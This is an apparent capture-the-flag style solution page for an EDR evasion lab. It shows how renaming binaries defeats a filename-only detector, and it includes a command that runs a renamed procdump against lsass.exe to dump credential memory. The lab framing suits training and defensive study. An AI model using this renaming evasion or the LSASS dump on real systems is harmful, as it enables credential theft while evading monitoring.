---
title: "Solution 03: Copy and Rename"
difficulty: easy
category: "Process Name Evasion"
---

[Back to Challenge]({{ '/challenges/03-copy-and-rename/' | relative_url }})

## Overview

Since the EDR has no hash-based detection, copying a binary to any non-blacklisted name works.

## Solution

```powershell
# Copy to an innocent-looking name
copy C:\Windows\notepad.exe C:\Temp\TextEditor.exe
.\TextEditor.exe

# Copy procdump with a system-sounding name
copy procdump.exe svcdiag.exe
.\svcdiag.exe -ma lsass.exe
```

## Why It Works

The EDR identifies processes solely by their executable filename. It has:
- No file hash checking (Rule 6 database is empty)
- No digital signature verification
- No file metadata analysis
- No YARA rule scanning

A binary's behavior is identical regardless of its filename. The copy is functionally the same as the original.
